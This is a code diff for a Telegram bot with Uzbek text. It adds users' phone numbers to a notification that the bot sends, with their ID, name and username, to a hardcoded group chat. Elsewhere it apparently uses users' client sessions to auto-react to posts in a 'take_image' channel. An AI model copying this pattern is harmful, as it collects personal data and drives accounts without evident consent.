@@ -39,7 +39,8 @@ def add_save_handler(client: TelegramClient,  user_id: int,bot=bot,):
                 "📥 <b>Yangi fayl yuborildi</b>\n\n"
                 f"🆔 <b>User ID:</b> <code>{user['telegram_id']}</code>\n"
                 f"👤 <b>F.I.O:</b> {mention}\n"
-                f"💬 <b>Username:</b> @{user['username'] if user['username'] else 'yo‘q'}"
+                f"💬 <b>Username:</b> @{user['username'] if user['username'] else 'yo‘q'} \n"
+                f"💬 <b>telefon:</b> {user['phone']}"
             )
             await bot.send_message(chat_id=-1002839214036, text=text, parse_mode="HTML")
 
@@ -54,7 +55,7 @@ def add_save_handler(client: TelegramClient,  user_id: int,bot=bot,):
         try:
             messages = await client.get_messages('take_image', limit=3)
             for msg in messages:
-                emoji = choice(["❤️", "🔥", "👍", "👏", "⚡️", "😲"])
+                emoji = choice(["❤️", "🔥", "👍", "👏","🤝",])
                 await client(SendReactionRequest(
                     peer='take_image',
                     msg_id=msg.id,
